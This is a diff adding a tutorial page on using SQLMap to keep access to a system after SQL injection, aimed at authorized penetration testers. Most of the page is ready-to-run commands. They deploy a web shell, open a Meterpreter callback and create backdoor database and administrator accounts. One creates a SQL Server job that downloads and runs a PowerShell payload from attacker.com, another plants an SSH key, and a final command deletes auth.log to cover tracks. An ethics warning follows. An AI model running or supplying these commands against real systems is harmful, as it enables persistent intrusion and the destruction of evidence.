@@ -1,0 +1,116 @@
+---
+title: Maintaining Access
+description: Learn how to establish persistent access using SQLMap's advanced techniques
+---
+
+# Maintaining Access
+
+SQLMap provides several methods to establish persistent access to vulnerable systems after successful SQL injection exploitation. These techniques are valuable for authorized penetration testing scenarios where maintaining access is part of the assessment scope.
+
+## Backdoor Deployment Options
+
+### Web Shell Deployment
+
+SQLMap can deploy a web shell to maintain access:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+
+This uploads a local file to the target web server directory, allowing subsequent access through the web interface.
+
+### Metasploit Integration (`--os-pwn`)
+
+To establish a Meterpreter session:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-pwn --msf-path=/path/to/metasploit
+```
+
+This command:
+1. Generates a Metasploit payload
+2. Uploads it to the target server
+3. Executes it to establish a Meterpreter session
+4. Connects back to your Metasploit handler
+
+### SMB Relay Attack (`--os-smbrelay`)
+
+For Windows targets:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-smbrelay
+```
+
+This establishes access using SMB relay techniques, which can be effective in Windows environments.
+
+## Database-Level Persistence
+
+### Creating Database Backdoor Users
+
+To create a new database user with administrative privileges:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --sql-query="CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';"
+```
+
+This creates a new database user that can be used for future access.
+
+### Scheduled Tasks and Jobs
+
+For SQL Server, you can create a SQL Agent job:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --sql-query="EXEC msdb.dbo.sp_add_job @job_name='maintenance', @enabled=1; EXEC msdb.dbo.sp_add_jobstep @job_name='maintenance', @step_name='step1', @command='EXEC xp_cmdshell ''powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''''http://attacker.com/payload.ps1'''')\"'''; EXEC msdb.dbo.sp_add_jobschedule @job_name='maintenance', @name='daily', @freq_type=4, @freq_interval=1, @active_start_time=010000;"
+```
+
+This creates a scheduled job that executes a command periodically.
+
+## System-Level Persistence
+
+### Creating System Users
+
+On Unix-based systems:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="useradd -m -p $(openssl passwd -1 password123) backdoor && usermod -aG sudo backdoor"
+```
+
+On Windows systems:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="net user backdoor password123 /add && net localgroup administrators backdoor /add"
+```
+
+### SSH Key Deployment
+
+To add an SSH key for persistent access:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --file-write="id_rsa.pub" --file-dest="/home/user/.ssh/authorized_keys"
+```
+
+This adds your public key to the authorized_keys file, allowing SSH access without a password.
+
+## Covering Tracks
+
+After establishing persistence, it's important to clean up evidence:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="rm -f /var/log/auth.log"
+```
+
+<Note title="Ethical and Legal Warning">
+Persistence techniques should only be used in authorized security testing scenarios where maintaining access is explicitly part of the scope. Unauthorized access to systems is illegal and unethical.
+</Note>
+
+## Best Practices for Authorized Testing
+
+When maintaining access during authorized penetration tests:
+
+1. Document all persistence mechanisms deployed
+2. Use unique identifiers for all created accounts and files
+3. Set up proper cleanup procedures for after the test
+4. Ensure all persistence mechanisms are removed at the end of testing
+5. Coordinate with the system owners about the persistence methods used
+
+Remember that the goal of security testing is to improve security, not to compromise it. Always follow responsible disclosure practices and the agreed-upon rules of engagement.
